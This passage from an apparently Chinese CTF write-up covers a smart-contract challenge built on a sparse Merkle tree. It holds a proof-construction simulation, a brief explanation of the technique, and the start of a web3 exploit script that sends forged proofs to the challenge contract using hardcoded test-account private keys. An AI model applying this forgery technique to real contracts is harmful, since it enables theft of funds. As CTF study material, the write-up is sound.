class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;----enter5----&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--------------&#x27;</span>)</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pickupTreasureChest</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 先做这个 根据递增的要求构造出5个地址 记录merge的顺序</span></span><br><span class=\"line\">    c1 = <span class=\"string\">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class=\"line\">    c2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    leaf = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\">    leaf[<span class=\"number\">0</span>] = <span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span></span><br><span class=\"line\">    leaf[<span class=\"number\">1</span>] = <span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span></span><br><span class=\"line\">    leaf[<span class=\"number\">2</span>] = <span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span></span><br><span class=\"line\">    leaf[<span class=\"number\">3</span>] = <span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span></span><br><span class=\"line\">    leaf[<span class=\"number\">4</span>] = <span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(leaf)):</span><br><span class=\"line\">        leaf[i] = Leaf(leaf[i],<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">19</span></span><br><span class=\"line\">    proof = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = c1</span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = c2</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    root = calcRoot(proof,leaf,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">findKey</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    c1 = <span class=\"string\">&#x27;0xbccd02410d2e51fe9783b9597d341834148ebbfd545ad02023fcf29e54ffc35e&#x27;</span></span><br><span class=\"line\">    c2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    leaf = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\">    leaf[<span class=\"number\">0</span>] = <span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span></span><br><span class=\"line\">    leaf[<span class=\"number\">1</span>] = <span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span></span><br><span class=\"line\">    leaf[<span class=\"number\">2</span>] = <span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span></span><br><span class=\"line\">    leaf[<span class=\"number\">3</span>] = <span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span></span><br><span class=\"line\">    leaf[<span class=\"number\">4</span>] = <span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(leaf)):</span><br><span class=\"line\">        leaf[i] = Leaf(leaf[i],<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">19</span></span><br><span class=\"line\">    proof = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = c1</span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = c2</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,leaf,oldroot) == oldroot</span><br><span class=\"line\">    <span class=\"keyword\">return</span> oldroot</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">def leave(oldroot):</span></span><br><span class=\"line\"><span class=\"string\">    b1 = &#x27;0x2510d5ab38c5a927545402b81c45a0b780bb7de6d395a41c0f2828381298f2db&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    b2 = &#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    h = &#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    proof = getProof(b1,b2,h)</span></span><br><span class=\"line\"><span class=\"string\">    prevLeaves = [Leaf(0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd,1)]</span></span><br><span class=\"line\"><span class=\"string\">    nextLeaves = [Leaf(0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd,0)]</span></span><br><span class=\"line\"><span class=\"string\">    assert calcRoot(proof,prevLeaves,oldroot) == oldroot</span></span><br><span class=\"line\"><span class=\"string\">    print(&#x27;next&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">    root = calcRoot(proof,nextLeaves,oldroot)</span></span><br><span class=\"line\"><span class=\"string\">    return root</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    root = init()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------init finish------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    root = enter1(root)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    root = enter2(root)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    root = enter3(root)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    root = enter4(root)</span><br><span class=\"line\">  </span><br><span class=\"line\">    root = enter5(root)</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    root = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    root = pickupTreasureChest(root)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    findKey(root)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#print(calcLeaf(Leaf(0x07DEB941F3feA2B239996E723E0000C8d79d3b38,1)).hex())</span></span><br></pre></td></tr></table></figure>\n\n\n<p>每次enter只需要记录上次enter修改root的最后一次merge就行<br>但pickupTreasureChest需要用到每次merge的信息<br>并且calcRoot计算的时候需要根据key决定merge的顺序<br>所以4个hacker的地址是需要精心构造的<br>先模拟一遍pickupTreasureChest 然后根据merge的顺序对应调整enter时merge的顺序（改height）<br>findKey的思路和enter差不多，因为mode是0所以value是0，只要把0都merge掉然后拿最后两个哈希值做一遍merge就能通过验证</p>\n<p>exp用了5次enter是因为本来以为需要利用一次leave，后来发现不需要，实际上4次enter就够了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> eth_abi <span class=\"keyword\">import</span> encode_abi</span><br><span class=\"line\"><span class=\"keyword\">from</span> web3 <span class=\"keyword\">import</span> Web3</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests, time</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">ONE_SHOT_MODE = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&quot;http://123.60.45.88:8545&quot;</span>)) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Globals</span></span><br><span class=\"line\">keccak = w3.keccak</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getMoney</span>(<span class=\"params\">target</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(w3.eth.get_balance(target))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> requests.post(<span class=\"string\">&#x27;http://123.60.45.88:8080/api/claim&#x27;</span>, data = &#123;<span class=\"string\">&#x27;address&#x27;</span>: target&#125;).status_code == <span class=\"number\">200</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] waiting for 30s for test ether&#x27;</span>)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">30</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(w3.eth.get_balance(target))</span><br><span class=\"line\"></span><br><span class=\"line\">deploy = <span class=\"string\">&#x27;0x1a20D3FF9D41440D9C6B93462A4f656496c693F8&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#getMoney(deploy)</span></span><br><span class=\"line\"><span class=\"comment\">#exit(0)</span></span><br><span class=\"line\">final_target = <span class=\"string\">&#x27;0x6991DD5156BBD73aae507F6A6020C960F2F8b9e7&#x27;</span></span><br><span class=\"line\">root = w3.eth.get_storage_at(final_target,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">target</span>):</span><br><span class=\"line\">    code = w3.eth.get_code(target)</span><br><span class=\"line\">    storage = w3.eth.get_storage_at(target,<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;root:<span class=\"subst\">&#123;storage.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    storage = w3.eth.get_storage_at(target,<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;smtMode:<span class=\"subst\">&#123;storage.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    storage = w3.eth.get_storage_at(target,<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;address:<span class=\"subst\">&#123;storage.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    storage = w3.eth.get_storage_at(target,<span class=\"number\">3</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;solved:<span class=\"subst\">&#123;storage.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getAccount</span>():</span><br><span class=\"line\">    acc = w3.eth.account.create()</span><br><span class=\"line\">    hacker, sk_hacker = acc.address, acc.key</span><br><span class=\"line\">    <span class=\"comment\">#print(&#x27;[+] hacker:&#x27;, hacker)</span></span><br><span class=\"line\">    <span class=\"comment\">#print(bin(int(hacker,base=16)))</span></span><br><span class=\"line\">    <span class=\"comment\">#print(&#x27;[+] key:&#x27;,sk_hacker)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hacker,sk_hacker</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">findHacker</span>():</span><br><span class=\"line\">    find = []</span><br><span class=\"line\">    hackers = []</span><br><span class=\"line\">    sk_hackers = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">        h,s = getAccount()</span><br><span class=\"line\">        hackers.append(h)</span><br><span class=\"line\">        sk_hackers.append(s)</span><br><span class=\"line\">        binary = <span class=\"built_in\">bin</span>(<span class=\"built_in\">int</span>(h,base=<span class=\"number\">16</span>))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">        binary = (<span class=\"number\">160</span> - <span class=\"built_in\">len</span>(binary)) * <span class=\"string\">&#x27;0&#x27;</span> + binary</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> k <span class=\"keyword\">in</span> find:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> binary[:k+<span class=\"number\">1</span>] == <span class=\"string\">&#x27;0&#x27;</span>*k+<span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(k,binary[:<span class=\"number\">5</span>],hackers[i],sk_hackers[i])</span><br><span class=\"line\">                find.append(k)</span><br><span class=\"line\"><span class=\"comment\">#findHacker()</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">hackers = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">hackers[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38&#x27;</span></span><br><span class=\"line\">hackers[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x1424021b77400221b9E86422571F76bF50acd44c&#x27;</span></span><br><span class=\"line\">hackers[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB&#x27;</span></span><br><span class=\"line\">hackers[<span class=\"number\">3</span>] = <span class=\"string\">&#x27;0x45AD33c37e5029804794f390cB2474349F2aDf12&#x27;</span></span><br><span class=\"line\">hackers[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">sk_hackers = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>)]</span><br><span class=\"line\">sk_hackers[<span class=\"number\">0</span>] = <span class=\"string\">b&quot;\\xef\\x1a\\xfa\\x87\\xde\\xb0\\x82\\xd4e\\x83\\x8c\\x1dR\\x8d.\\xfdyq\\xcaX\\x16\\x9f\\x1bZ\\xfe\\xbe:\\x8c\\xcf&#x27;Y\\xbc&quot;</span></span><br><span class=\"line\">sk_hackers[<span class=\"number\">1</span>] = <span class=\"string\">b&#x27;2\\xc3\\x99\\x97\\xc5\\\\\\xe6^\\xc8\\x8eKQ\\xb3\\x93\\xba(\\x06\\x9e%Npd\\x8b\\xdf\\x88\\x82\\xdc\\x9c\\xe8\\x99P\\xf1&#x27;</span></span><br><span class=\"line\">sk_hackers[<span class=\"number\">2</span>] = <span class=\"string\">b&#x27;.\\x8d-\\x17W\\xe27\\xc1\\xb9 \\x9ax\\xb3A\\x0eC\\xfe\\x00\\x87\\xc4&#125;v.9\\xa6g\\x96d\\xd7c,\\xcf&#x27;</span></span><br><span class=\"line\">sk_hackers[<span class=\"number\">3</span>] = <span class=\"string\">b&#x27;^Y$eKx\\x1f72\\x07\\xd9\\x98F\\x0c3\\x92N\\x01+\\xc0J\\xc7\\x1c\\xa5Bq\\x8bhC\\xef)T&#x27;</span></span><br><span class=\"line\">sk_hackers[<span class=\"number\">4</span>] = <span class=\"string\">b&quot;\\xa5\\x13&#x27;\\xfc\\xa8\\xbe\\xd2\\x94J\\xb7\\xc6wH:\\xbb\\xc5\\x8c\\x8d\\xbf\\xba\\xbdG.\\xa9=\\x89)\\x8e\\xe5\\xea\\x12\\xcb&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#getMoney(hackers[4])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#getAccount()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func_sig</span>(<span class=\"params\">func: <span class=\"built_in\">bytes</span></span>) -&gt; <span class=\"built_in\">bytes</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(func, <span class=\"built_in\">str</span>):</span><br><span class=\"line\">        func = func.encode()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> keccak(func)[:<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_txn</span>(<span class=\"params\">src, dst, data, value=<span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;chainId&quot;</span>: w3.eth.chain_id,</span><br><span class=\"line\">        <span class=\"string\">&quot;from&quot;</span>: src,</span><br><span class=\"line\">        <span class=\"string\">&quot;to&quot;</span>: dst,</span><br><span class=\"line\">        <span class=\"string\">&quot;gasPrice&quot;</span>: w3.toWei(<span class=\"number\">1</span>,<span class=\"string\">&#x27;gwei&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;gas&quot;</span>: <span class=\"number\">0x321850</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;value&quot;</span>: w3.toWei(value,<span class=\"string\">&#x27;wei&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(src),</span><br><span class=\"line\">        <span class=\"string\">&quot;data&quot;</span>: data</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">send_tx</span>(<span class=\"params\">signed_txn, send: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> send <span class=\"keyword\">or</span> ONE_SHOT_MODE:</span><br><span class=\"line\">        txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).<span class=\"built_in\">hex</span>()</span><br><span class=\"line\">        txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> txn_receipt[<span class=\"string\">&#x27;status&#x27;</span>] == <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">send_hacker_tx</span>(<span class=\"params\">hacker,target,data,sk_hacker</span>):</span><br><span class=\"line\">    <span class=\"comment\">#通过hacker调用target的data函数</span></span><br><span class=\"line\">    signed_txn = w3.eth.account.signTransaction(get_txn(hacker, target, data), sk_hacker)</span><br><span class=\"line\">    send_tx(signed_txn)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter</span>(<span class=\"params\">proof</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> func_sig(<span class=\"string\">&#x27;enter(bytes32[])&#x27;</span>) + encode_abi([<span class=\"string\">&#x27;bytes32[]&#x27;</span>], [proof])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pickupTreasureChest_sig</span>(<span class=\"params\">proof</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> func_sig(<span class=\"string\">&#x27;pickupTreasureChest(bytes32[])&#x27;</span>) + encode_abi([<span class=\"string\">&#x27;bytes32[]&#x27;</span>], [proof])</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">findKey_sig</span>(<span class=\"params\">proof</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> func_sig(<span class=\"string\">&#x27;findKey(bytes32[])&#x27;</span>) + encode_abi([<span class=\"string\">&#x27;bytes32[]&#x27;</span>], [proof])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">openTreasureChest_sig</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> func_sig(<span class=\"string\">&#x27;openTreasureChest()&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getProof</span>(<span class=\"params\">b1,b2,h</span>):</span><br><span class=\"line\">    proof = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = h</span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = b1</span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = b2</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> proof</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter1</span>():</span><br><span class=\"line\">    hacker = hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    sk_hacker = sk_hackers[<span class=\"number\">0</span>]</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span 